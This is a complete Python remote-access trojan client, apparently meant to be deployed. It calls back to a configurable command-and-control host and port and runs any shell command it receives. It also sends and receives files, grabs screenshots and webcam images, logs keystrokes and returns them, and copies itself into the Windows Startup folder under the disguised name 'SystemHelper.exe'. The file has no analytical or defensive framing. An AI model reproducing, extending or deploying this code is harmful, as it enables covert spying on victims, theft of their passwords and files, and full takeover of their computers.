# client.py
import socket
import subprocess
import os
import sys
import platform
import threading
import time
import shutil
import cv2  # opencv-python
from pynput import keyboard  # pynput
from PIL import ImageGrab  # pillow

# CONFIGURATION
C2_IP = "YOUR_SERVER_IP"
C2_PORT = 5555
PERSIST = True  # Add to startup

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def download_file(filename):
    try:
        with open(filename, 'rb') as f:
            return f.read()
    except:
        return b"[-] File not found"

def upload_file(filename, data):
    try:
        with open(filename, 'wb') as f:
            f.write(data)
        return "[+] Upload successful"
    except:
        return "[-] Upload failed"

def screenshot():
    try:
        img = ImageGrab.grab()
        img.save("screenshot.png")
        with open("screenshot.png", 'rb') as f:
            return f.read()
    except:
        return b"[-] Screenshot failed"

def webcam_capture():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            with open("webcam.jpg", 'rb') as f:
                return f.read()
        return b"[-] No webcam"
    except:
        return b"[-] Webcam error"

# Keylogger
log = ""
def on_press(key):
    global log
    try:
        log += key.char
    except:
        log += f"[{key}]"
    if len(log) > 200:
        flush_log()

def flush_log():
    global log
    if log:
        with open("keylog.txt", 'a') as f:
            f.write(log)
        log = ""

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def persist_startup():
    if sys.platform == "win32":
        appdata = os.getenv('APPDATA')
        startup = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, 'SystemHelper.exe')
        if not os.path.exists(dest):
            shutil.copy2(sys.executable, dest)

def main():
    if PERSIST:
        persist_startup()
    start_keylogger()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            while True:
                cmd = s.recv(4096).decode()
                if not cmd:
                    break
                if cmd.lower() == 'quit':
                    s.close()
                    sys.exit(0)
                elif cmd.startswith('download '):
                    filename = cmd.split(' ', 1)[1]
                    data = download_file(filename)
                    s.send(data)
                elif cmd.startswith('upload '):
                    parts = cmd.split(' ', 2)
                    if len(parts) == 3:
                        filename = parts[1]
                        data = s.recv(102400)
                        result = upload_file(filename, data)
                        s.send(result.encode())
                elif cmd.lower() == 'screenshot':
                    img_data = screenshot()
                    s.send(img_data)
                elif cmd.lower() == 'webcam':
                    img_data = webcam_capture()
                    s.send(img_data)
                elif cmd.lower() == 'keylog':
                    flush_log()
                    try:
                        with open("keylog.txt", 'rb') as f:
                            s.send(f.read())
                    except:
                        s.send(b"No keylog data")
                else:
                    output = execute_cmd(cmd)
                    s.send(output.encode())
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
